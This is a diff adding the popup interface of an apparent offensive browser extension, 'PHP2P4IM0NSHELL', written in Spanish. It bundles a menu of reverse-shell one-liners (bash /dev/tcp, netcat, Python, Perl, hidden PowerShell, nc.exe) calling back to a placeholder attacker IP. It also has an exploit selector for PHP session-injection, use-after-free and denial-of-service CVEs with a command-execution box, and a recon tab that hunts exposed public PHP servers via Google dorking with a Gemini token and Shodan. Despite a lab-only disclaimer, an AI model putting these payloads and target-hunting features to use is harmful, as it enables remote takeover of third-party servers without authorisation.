@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>PHP2P4IM0NSHELL</title>
+    <link rel="stylesheet" href="popup.css">
+</head>
+<body>
+    <div class="linea-escaner"></div>
+    <div class="contenedor-maestro">
+        <!-- PANEL IZQUIERDO: TERMINAL Alpine v86 -->
+        <div id="panel-terminal" class="panel-lateral">
+            <div class="terminal-header">
+                <span class="icono">&#x1F4BB;</span> ALPINE_LINUX_V86
+                <button id="btnCerrarTerminal" class="btn-mini">X</button>
+            </div>
+            <div class="terminal-frame-container">
+                <div id="placeholder-terminal" class="terminal-loading">
+                    INICIALIZANDO SISTEMA V86...<br><br>
+                    <span style="color:#ff003c;">[!] Para recibir una reverse shell desde un servidor publico,<br>
+                    usa SSH a tu Kali + port forwarding, o NetHunter SSH.</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- PANEL DERECHO: INTERFAZ PRINCIPAL -->
+        <div class="marco-principal">
+            <div class="cabecera">
+                <div class="area-logo">
+                    <img src="images/icon.png" onerror="this.style.display='none'" class="img-glitch">
+                    <span class="titulo">PHP2P4IM0NSHELL</span>
+                </div>
+                <div class="subtitulo">v1.2.0 // por P4IM0N</div>
+            </div>
+
+            <div class="barra-objetivo">
+                <span class="etiqueta">TARGET:</span>
+                <span id="objetivo-host" class="host">desconocido</span>
+                <button id="btnReset" class="btn-mini" title="Limpiar estado y cache del motor">RESET</button>
+            </div>
+
+            <!-- NAV TABS -->
+            <div class="nav-tabs">
+                <button class="nav-tab activo" data-target="vista-principal">CMD_CENTER</button>
+                <button class="nav-tab" data-target="vista-recon">RECON &#x1F4E1;</button>
+            </div>
+
+            <!-- VISTA CMD_CENTER -->
+            <div id="vista-principal" class="vista-panel">
+                <div class="terminal">
+
+                    <!-- Modulo 1: Reconocimiento Pasivo -->
+                    <div class="bloque-modulo">
+                        <div class="cabecera-modulo">
+                            <span>&#x1F441;&#xFE0F; RECONOCIMIENTO_PASIVO</span>
+                            <span id="insignia-pasiva" class="insignia-estado parpadeo">ESCANEANDO...</span>
+                        </div>
+                        <div class="contenido-modulo">
+                            <div class="fila-version">
+                                <span class="etiqueta">PHP:</span>
+                                <span id="insignia-version" class="insignia-estado">?</span>
+                                <span id="insignia-riesgo" class="riesgo">sin datos</span>
+                            </div>
+                            <ul id="lista-pasiva" class="texto-consola">
+                                <li>Inicializando fingerprint PHP...</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <!-- Modulo 2: Sonda Activa -->
+                    <div class="bloque-modulo">
+                        <div class="cabecera-modulo">
+                            <span>&#x1F4E1; SONDA_ACTIVA (PHP:SESSION:UPLOAD)</span>
+                        </div>
+                        <div class="contenido-modulo">
+                            <button id="btnHuella" class="btn-ciber">INICIAR MULTIPART PROBE</button>
+                            <div class="texto-mini">Sube un archivo y sondea el JSON de progreso: detecta session.upload_progress real.</div>
+                            <div id="resultado-huella" class="resultado-oculto">
+                                <ul id="lista-activa" class="texto-consola"></ul>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Modulo 3: Explotacion -->
+                    <div class="bloque-modulo zona-peligro">
+                        <div class="cabecera-modulo texto-error" style="display:flex;justify-content:space-between;align-items:center;">
+                            <span>&#x1F480; MODULO_EXPLOTACION</span>
+                            <div class="botones-header">
+                                <div class="payload-wrapper">
+                                    <button id="btnPayloads" class="btn-mini-term btn-payload" title="Reverse Shell Payloads">Payload Rshell &#x25BC;</button>
+                                    <div id="menuPayloads" class="menu-payloads" style="display:none;">
+                                        <div class="payload-group">
+                                            <div class="payload-label">LINUX</div>
+                                            <div class="payload-item" data-code="bash -i >&amp; /dev/tcp/TU_IP/8889 0>&amp;1">Bash TCP</div>
+                                            <div class="payload-item" data-code="mkfifo /tmp/f; nc TU_IP 8889 < /tmp/f | /bin/sh > /tmp/f 2>&amp;1">Netcat Pipe</div>
+                                            <div class="payload-item" data-code="python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((&quot;TU_IP&quot;,8889));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])'">Python3</div>
+                                            <div class="payload-item" data-code="perl -e 'use Socket;$i=&quot;TU_IP&quot;;$p=8889;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,&quot;>&amp;S&quot;);open(STDOUT,&quot;>&amp;S&quot;);open(STDERR,&quot;>&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);'">Perl</div>
+                                        </div>
+                                        <div class="payload-group">
+                                            <div class="payload-label">WINDOWS</div>
+                                            <div class="payload-item" data-code="powershell -NoP -NonI -W Hidden -Exec Bypass -c &quot;$c=New-Object Net.Sockets.TCPClient('TU_IP',8889);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&amp;1|Out-String);$r2=$r+'PS '+(pwd).Path+'&gt; ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}&quot;">PowerShell</div>
+                                            <div class="payload-item" data-code="nc.exe TU_IP 8889 -e cmd.exe">Netcat.exe</div>
+                                        </div>
+                                        <div class="payload-group">
+                                            <div class="payload-label">PHP / SESION</div>
+                                            <div class="payload-item" data-code="id">id (prueba)</div>
+                                            <div class="payload-item" data-code="uname -a; id; pwd">fingerprint host</div>
+                                            <div class="payload-item" data-code="bash -c 'bash -i >&amp; /dev/tcp/TU_IP/8889 0>&amp;1'">reverse shell (LFI)</div>
+                                        </div>
+                                        <div class="payload-group">
+                                            <div class="payload-label">UAF cmd (max 14 bytes)</div>
+                                            <div class="payload-item" data-code="id>/tmp/p1">id>/tmp/p1</div>
+                                            <div class="payload-item" data-code="id>p1.txt">id&gt;p1.txt</div>
+                                            <div class="payload-item" data-code="sh</tmp/c">sh&lt;/tmp/c</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="tooltip-wrapper">
+                                    <button id="btnAbrirTerminal" class="btn-mini-term"><span class="blink">&gt;_</span> TERMINAL</button>
+                                    <span class="tooltip-text">Alpine Linux v86 con internet. Para shells reales usa SSH + port forwarding a tu Kali o NetHunter.</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="caja-selector">
+                            <select id="selectorExploit" class="input-ciber">
+                                <option value="CVE-2026-109619">CVE-2026-109619 (Session Injection + LFI exec)</option>
+                                <option value="CVE-2026-109618">CVE-2026-109618 (RCE UAF &mdash; pre-flight + handoff)</option>
+                                <option value="CVE-2026-10961x">CVE-2026-10961x (DoS &mdash; escalera OOM)</option>
+                            </select>
+                        </div>
+
+                        <div id="cve-info-box" class="cve-info">
+                            <span id="cve-info-text"></span>
+                        </div>
+
+                        <div class="grupo-input">
+                            <span class="prompt">$</span>
+                            <input type="text" id="entradaComando" class="input-ciber" placeholder="id" value="id">
+                            <button id="btnExploit" class="btn-ciber btn-peligro">EJECUTAR</button>
+                        </div>
+                        <div class="fila-sesion">
+                            <span class="etiqueta">save_path</span>
+                            <input type="text" id="rutaSesion" class="input-ciber" value="data/sessions" title="session.save_path del servidor (Linux: /tmp | Windows: C:/ruta/sessions)">
+                        </div>
+
+                        <div id="estado-exploit" class="linea-estado">Inyectando Payload...</div>
+                        <div id="resultado-exploit" class="salida-consola">
+                            <pre id="salida-rce">ESPERANDO ENTRADA...</pre>
+                        </div>
+
+                        <div id="caja-handoff" class="caja-handoff" style="display:none;">
+                            <div class="cabecera-handoff">&#x1F517; CHAIN_HANDOFF &mdash; PoC fuera del navegador</div>
+                            <ul id="lista-preflight" class="chk-lista"></ul>
+                            <pre id="cmd-handoff" class="cmd-handoff"></pre>
+                            <button id="btnCopiarHandoff" class="btn-mini-term" style="margin-left:0">COPIAR COMANDO</button>
+                            <div class="texto-mini">El chain UAF necesita sockets crudos, multipart byte-exacto y lectura de Set-Cookie: no es alcanzable con fetch(). La extension valida los requisitos y te entrega el disparo calibrado.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- VISTA RECON -->
+            <div id="vista-recon" class="vista-panel" style="display:none;">
+                <div class="terminal">
+                    <div class="bloque-modulo">
+                        <div class="cabecera-modulo"><span>&#x1F916; GOOGLE_NEURAL_UPLINK</span></div>
+                        <div class="contenido-modulo">
+                            <input type="password" id="geminiToken" class="input-ciber" placeholder="PEGAR GEMINI API TOKEN">
+                            <div class="texto-mini">Caza de targets PHP via Google Search Grounding.</div>
+                        </div>
+                    </div>
+                    <div class="bloque-modulo zona-caza">
+                        <div class="cabecera-modulo" style="color:#ffae00"><span>&#x1F3AF; TARGETING_AUTOMATICO</span></div>
+                        <div class="caja-selector">
+                            <select id="selectorDork" class="input-ciber">
+                                <option value="php_apache_exposed">PHP Apache (Public Exposed)</option>
+                                <option value="php_wordpress">WordPress PHP (Login Exposed)</option>
+                                <option value="php_legacy_eol">PHP Legacy EOL (7.x/8.0/8.1)</option>
+                                <option value="php_fpm_upload">PHP-FPM Upload Progress Enabled</option>
+                                <option value="php_magento">Magento/OpenCart PHP Apps</option>
+                            </select>
+                        </div>
+                        <button id="btnCazar" class="btn-ciber btn-caza">EJECUTAR GOOGLE DORKING</button>
+                    </div>
+                    <div class="bloque-modulo" style="border-color:#cc2b2b;">
+                        <div class="cabecera-modulo" style="color:#cc2b2b"><span>&#x1F52D; SHODAN_LINK_MANUAL</span></div>
+                        <div class="contenido-modulo" style="text-align:center;">
+                            <button id="btnShodan" class="btn-ciber" style="border-color:#cc2b2b;color:#cc2b2b;">CAZA SHODAN PHP</button>
+                            <div class="texto-mini" style="margin-top:5px;color:#888;">(Requiere login en shodan.io)</div>
+                        </div>
+                    </div>
+                    <div id="resultado-caza" class="salida-consola">
+                        <div class="cabecera-resultados">&gt; OBJETIVOS PHP VIVOS (GOOGLE INDEX):</div>
+                        <div id="lista-ips" class="grid-ips"><div class="mensaje-espera">ESPERANDO ORDEN...</div></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pie-pagina">
+                <div class="aviso-etico" title="Herramienta educativa para pruebas de seguridad autorizadas.">
+                    <span class="luz-etica"></span> Uso etico responsable &mdash; solo laboratorios propios
+                </div>
+                SISTEMA LISTO &middot; v1.2.0 <span class="parpadeo">_</span>
+            </div>
+        </div>
+    </div>
+    <script src="popup.js"></script>
+</body>
+</html>
